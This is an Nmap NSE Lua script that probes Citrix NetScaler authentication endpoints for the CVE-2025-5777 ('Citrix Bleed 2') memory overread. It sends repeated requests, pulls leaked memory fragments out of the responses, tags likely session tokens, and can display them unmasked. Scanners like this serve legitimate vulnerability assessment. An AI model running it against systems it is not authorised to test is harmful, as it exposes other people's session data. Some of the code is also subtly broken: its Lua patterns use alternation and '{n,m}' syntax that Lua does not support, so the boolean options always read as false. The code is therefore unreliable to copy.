local http      = require "http"
local nmap      = require "nmap"
local shortport = require "shortport"
local stdnse    = require "stdnse"
local vulns     = require "vulns"
local string    = require "string"
local url       = require "url"  

--[[
Title:     Citrix Bleed 2 (CVE-2025-5777) Memory Leak Detector
Author:    Tomas Illuminati <contact@tomasilluminati.com>
License:   Same as Nmap (see https://nmap.org/book/man-legal.html)
Categories: {"vuln", "intrusive"}

Description:
  Detects insufficient input validation in NetScaler Gateway or AAA vservers
  that may cause memory overread and leakage during authentication flows
  (e.g., fragments in InitialValue, StateContext, or ctx within RedirectURL),
  or extra content appended to the end of the portal’s XML/HTML.

Usage:
  nmap -p443 --script citrix-bleed2.nse <host>

  Optional profiles:
    nmap -p443 --script citrix-bleed2.nse \
      --script-args 'citrixbleed2.profile=verbose' <host>

  Optional fine-tuning arguments:
    --script-args \
      'citrixbleed2.ssl=true,\
        citrixbleed2.path=/p/u/doAuthentication.do,\
        citrixbleed2.tries=10,\
        citrixbleed2.delay_ms=500,\
        citrixbleed2.timeout=10000,\
        citrixbleed2.body=login,\
        citrixbleed2.leak_preview=false,\
        citrixbleed2.preview_len=64,\
        citrixbleed2.payload_len=256'

Notes:
  (intrusive) Sends requests to authentication or portal endpoints.
  By default, leaks are masked; enable preview with citrixbleed2.leak_preview=true.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2025-5777
  https://support.citrix.com/support-home/kbsearch/article?articleNumber=CTX693420
  https://www.cyber.gc.ca/en/alerts-advisories/vulnerabilities-impacting-citrix-netscaler-adc-netscaler-gateway-cve-2025-5349-cve-2025-5777-cve-2025-6543
  NSE docs: https://nmap.org/book/nse.html , libs: https://nmap.org/nsedoc/
]]

description = [[Detects memory overread or data leakage in NetScaler (Gateway or AAA) due to insufficient input validation in authentication flows (CVE-2025-5777).]]
author      = "Tomas Illuminati <contact@tomasilluminati.com>"
license     = "Same as Nmap (see https://nmap.org/book/man-legal.html)"
categories  = { "vuln", "intrusive" }


portrule = shortport.port_or_service({443, 8443}, {"https", "ssl"}, "tcp")

local defaults = {
  ssl          = true,   
  path         = "/p/u/doAuthentication.do",
  tries        = 10,     
  delay_ms     = 500,      
  timeout      = 10000,
  body         = "login", 
  leak_preview = false,
  preview_len  = 64,
  profile      = "default",
  payload_len  = 256, 
}

--- Build the authentication payload string.
-- @param base string|nil  Base string for payload (defaults to "login").
-- @param _      any      Unused placeholder parameter.
-- @return string         The generated payload.
local function make_payload(base, _)
  local base_s = tostring(base or "login")
  return base_s
end

--- Parse and normalize script arguments for citrix-bleed2.
-- @return table  Configuration table with fields:
--   ssl (boolean), path (string), tries (number), delay_ms (number),
--   timeout (number), body (string), leak_preview (boolean),
--   preview_len (number), profile (string), payload_len (number).
local function get_args()
  local args = stdnse.get_script_args() or {}
  local function pick(k)
    local a = args["citrixbleed2."..k]
    if a == nil then a = args["citrix-bleed2."..k] end
    return a
  end
  local out = {}
  for k,_ in pairs(defaults) do out[k] = pick(k) ~= nil and pick(k) or defaults[k] end
  out.tries        = tonumber(out.tries) or defaults.tries
  out.delay_ms     = tonumber(out.delay_ms) or defaults.delay_ms
  out.timeout      = tonumber(out.timeout) or defaults.timeout
  out.preview_len  = tonumber(out.preview_len) or defaults.preview_len
  out.payload_len  = tonumber(out.payload_len) or defaults.payload_len
  out.leak_preview = tostring(out.leak_preview):match("^(true|1)$") ~= nil
  out.ssl          = tostring(out.ssl):match("^(true|1)$") ~= nil
  out.profile      = tostring(out.profile)
  return out
end

local function apply_profile(cfg)
  if cfg.profile == "verbose" then
    cfg.ssl          = true
    cfg.tries        = math.max(cfg.tries, 10) 
    cfg.leak_preview = true
    cfg.preview_len  = math.max(cfg.preview_len, 128)
  elseif cfg.profile == "paranoid" then
    cfg.ssl          = true
    cfg.tries        = math.max(cfg.tries, 12)
    cfg.delay_ms     = math.max(cfg.delay_ms, 800)
    cfg.leak_preview = false
  elseif cfg.profile == "fast" then
    cfg.tries        = math.max(2, cfg.tries or 2)
    cfg.delay_ms     = 200
  end
  return cfg
end

--- Approximate string entropy by counting unique characters.
-- @param s string|nil  Input string to measure.
-- @return number       Approximate entropy (unique chars / window size).
local function entropy_approx(s)
  if not s or #s == 0 then return 0 end
  local seen, n = {}, 0
  local window = math.min(#s, 96)
  for i = 1, window do
    local c = s:sub(i, i)
    if not seen[c] then seen[c], n = true, n + 1 end
  end
  return n / window
end

--- Extract cookies from HTTP response headers into a table.
-- @param h table|nil  Response header table (keys may include "set-cookie").
-- @return table       Cookie jar mapping names to values.
local function parse_set_cookies(h)
  local jar = {}
  if not h then return jar end
  local sc = h["set-cookie"] or h["Set-Cookie"] or h["Set-cookie"]
  if not sc then return jar end
  local list = {}
  if type(sc) == "table" then
    list = sc
  elseif type(sc) == "string" then
    list = { sc }
  end
  for _, line in ipairs(list) do
    local nv = line:match("^%s*([^=;,%s]+)=([^;,%s]+)")
    if nv then
      local name, value = nv:match("^([^=]+)=(.+)$")
      if name and value then
        jar[name] = value
      end
    end
  end
  return jar
end

local function cookie_header_from(jar)
  local parts = {}
  for k,v in pairs(jar) do
    parts[#parts+1] = k .. "=" .. v
  end
  if #parts == 0 then return nil end
  return table.concat(parts, "; ")
end

local function merge_cookie_jars(dst, src)
  for k,v in pairs(src or {}) do
    dst[k] = v
  end
end


local function get_redirect_ctx(xml)
  local ru = xml:match("<[%w:]*RedirectURL>(.-)</[%w:]*RedirectURL>")
  if not ru or ru == "" then return nil end
  local q = ru:match("%?([^#]+)") or ""
  local ctx = q:match("ctx=([^&;]+)")
  if not ctx then return nil end
  ctx = url.unescape(ctx)
  ctx = ctx:gsub("%s+$","")
  local b64url = ctx:gsub("-", "+"):gsub("_", "/")
  local pad = #b64url % 4
  if pad == 2 then b64url = b64url .. "=="
  elseif pad == 3 then b64url = b64url .. "="
  end
  return ctx, b64url
end

--- Determine if HTTP response contains leaked data fragments.
-- @param resp table|nil  HTTP response (with .status, .header, .body).
-- @return string|false   Leaked fragment string or false if none detected.
local function looks_like_leak(resp)
  local ok, result = pcall(function()
    if not resp or not resp.status then return false end
    if resp.status < 200 or resp.status >= 600 then return false end

    local headers = resp.header or {}
    local ct  = (headers["content-type"] or headers["Content-Type"] or ""):lower()
    local cit = headers["x-citrix-application"] or headers["X-Citrix-Application"] or ""
    local b   = resp.body or ""
    if b == "" then return false end

    local iv_any = b:match("<[%w:]*InitialValue>(.-)</[%w:]*InitialValue>")
    if iv_any and iv_any:gsub("%s","") ~= "" then
      return iv_any
    end

    local root_ok = b:find("<AuthenticateResponse", 1, true) ~= nil
    if root_ok then
      local sc = b:match("<[%w:]*StateContext>(.-)</[%w:]*StateContext>")
      if sc and sc:gsub("%s","") ~= "" and (#sc >= 64 or entropy_approx(sc) > 0.45) then
        return sc
      end
      local ctxv, b64norm = get_redirect_ctx(b)
      if ctxv and #ctxv >= 32 then
        local looks_b64 = false
        if b64norm then
          local slice = b64norm:sub(1, 128)
          looks_b64 = (#slice % 4 == 0) and slice:match("^[A-Za-z0-9+/=]+$")
        end
        local e = entropy_approx(ctxv)
        if (looks_b64 and #ctxv >= 64 and e > 0.32) or (e > 0.55) then
          return ctxv
        end
      end
      local _, epos = b:find("</[%w:]*AuthenticateResponse>")
      if epos then
        local tail = b:sub(epos + 1)
        if tail:match("%S") and (#tail >= 64 or entropy_approx(tail) > 0.38) then
          return tail
        end
      end
    end


    if ct:find("text/html", 1, true) or cit ~= "" then
      local bl = b:lower()
      local _, ehtml = bl:find("</html>")
      if ehtml then
        local tail = b:sub(ehtml + 1)
        if tail:match("%S") and (#tail >= 64 or entropy_approx(tail) > 0.38) then
          return tail
        end
      end
      local m = b:match("([A-Za-z0-9%+/%-_=]{64,512})")
      if m and entropy_approx(m) > 0.35 then
        return m
      end
    end

    if resp.status >= 500 and #b >= 32 then
      local e = entropy_approx(b)
      if e > 0.38 then
        return b
      end
    end

    local tail = (#b > 4096) and b:sub(-2048) or ""
    if tail ~= "" then
      if tail:match("[%z\1-\8\11\12\14-\31]") or entropy_approx(tail) > 0.40 then
        return tail
      end
    end

    return false
  end)
  return ok and result or false
end

--- Identify data types present in leaked fragment.
-- @param s string|nil  Leaked data string.
-- @return table        Array of detected types.
local function detect_types(s)
  local types = {}
  if s then
    local trimmed  = s:gsub("[%r\n]","")
    local slice    = trimmed:sub(1, 128)
    local b64slice = slice:gsub("-", "+"):gsub("_", "/")
    if (#b64slice % 4 == 0) and b64slice:match("^[A-Za-z0-9+/=]+$") then
      types[#types+1] = "Base64/Base64URL"
    end
    if trimmed:match("%x%x%x%x%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%x%x%x%x%x%x%x%x") then
      types[#types+1] = "UUID/GUID"
    end
    local low = trimmed:lower()
    if low:find("session",1,true) or low:find("cookie",1,true) then
      types[#types+1] = "Session token (likely)"
    end
  end
  return types
end

--- Main NSE action: perform Citrix BLEED 2 memory leak detection.
-- @param host table  Host object provided by Nmap.
-- @param port table  Port object provided by Nmap.
-- @return string     Nmap vuln.Report output.
action = function(host, port)
  local cfg    = apply_profile(get_args())
  stdnse.debug1("citrix-bleed2: cfg.tries=%s profile=%s", tostring(cfg.tries), cfg.profile)

  local report = vulns.Report:new(SCRIPT_NAME, host, port)
  local vuln   = {
    title       = "CVE-2025-5777 Citrix Bleed 2 Memory Leak",
    ids         = { "CVE-2025-5777" },
    state       = vulns.STATE.NOT_VULN,
    risk_factor = "High",
    description = [[Memory overread due to inadequate input validation when NetScaler runs as Gateway or AAA vserver. Responses may contain leaked fragments in auth XML fields or appended data after XML/HTML.]],
    references  = {
      "https://nvd.nist.gov/vuln/detail/CVE-2025-5777",
      "https://support.citrix.com/support-home/kbsearch/article?articleNumber=CTX693420",
      "https://www.cyber.gc.ca/en/alerts-advisories/vulnerabilities-impacting-citrix-netscaler-adc-netscaler-gateway-cve-2025-5349-cve-2025-5777-cve-2025-6543",
    },
    dates       = { disclosure = { year="2025", month="06", day="17" } },
  }

  local cookiejar = {}

  local options = {
    header = {
      ["Content-Type"]    = "application/x-www-form-urlencoded",
      ["User-Agent"]      = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      ["Accept-Encoding"] = "identity",
    },
    timeout       = cfg.timeout,
    redirect_ok   = false,
    no_cache      = true,
    max_body_size = 262144,  
  }

  local paths = {
    { path = cfg.path,                             method = "POST" },
  }
  if cfg.profile == "verbose" then
    paths[#paths+1] = { path = "/nf/auth/doSaml",                 method = "POST" }
    paths[#paths+1] = { path = "/logon/LogonPoint/tmindex.html",  method = "GET"  }
    paths[#paths+1] = { path = "/logon/LogonPoint/index.html",    method = "GET"  }
    paths[#paths+1] = { path = "/Citrix/StoreWeb/",               method = "GET"  }
    paths[#paths+1] = { path = "/vpn/index.html",                 method = "GET"  }
  elseif cfg.profile == "fast" then
    paths[#paths+1] = { path = "/nf/auth/doSaml",                 method = "POST" }
  end

  local leaked, used_path, used_method
  local tls_legacy_err = nil

  for _, entry in ipairs(paths) do
    local p = entry.path
    local method = entry.method or "POST"
    for i = 1, cfg.tries do
      options.content = (method == "POST") and make_payload(cfg.body, cfg.payload_len) or nil

      local ck = cookie_header_from(cookiejar)
      if ck then options.header["Cookie"] = ck end

      stdnse.debug2("citrix-bleed2: %s %s (%d/%d)", method, p, i, cfg.tries)
      local ok, resp
      if method == "POST" then
        ok, resp = pcall(http.post, host, port, p, options)
      else
        ok, resp = pcall(http.get, host, port, p, options)
      end

      if not ok then
        local msg = tostring(resp or "")
        if msg:find("unsafe legacy renegotiation disabled", 1, true) then
          tls_legacy_err = "Target requires legacy TLS renegotiation (client disabled)"
          break
        end
      end

      if ok and resp and resp.status then
        local newjar = parse_set_cookies(resp.header)
        merge_cookie_jars(cookiejar, newjar)

        local iv = looks_like_leak(resp)
        if iv then
          leaked, used_path, used_method = iv, p, method
          break
        end
      end

      if i < cfg.tries then stdnse.sleep(cfg.delay_ms/1000) end
    end
    if leaked or tls_legacy_err then break end
  end

  if tls_legacy_err and not leaked then
    vuln.state = vulns.STATE.UNKNOWN
    vuln.check_results = ("TLS issue: %s; paths=%d"):format(tls_legacy_err, #paths)
    return report:make_output(vuln)
  end

  if leaked then
    vuln.state = vulns.STATE.VULN
    stdnse.debug1("citrix-bleed2: leak len=%d", #leaked)
    local preview = leaked:sub(1, cfg.preview_len)
    local types   = detect_types(leaked)

    local shown
    if cfg.leak_preview then
      shown = preview
    else
      local keep = math.min(16, #preview)
      shown = preview:sub(1, keep) .. string.rep("*", math.max(0, #preview - keep))
    end

    vuln.extra_info = ("Preview: %s (len=%d)"):format(shown, #leaked)
    if #types > 0 then
      vuln.extra_info = vuln.extra_info .. "\nDetected types: " .. table.concat(types, ", ")
    end
    vuln.check_results = ("Path: %s %s, tries=%d"):format(
      tostring(used_method or "POST"),
      tostring(used_path or cfg.path),
      cfg.tries
    )
  else
    stdnse.debug2("citrix-bleed2: No leak after %d tries across %d paths", cfg.tries, #paths)
    vuln.check_results = ("No leak: tries=%d, paths=%d"):format(cfg.tries, #paths)
  end

  return report:make_output(vuln)
end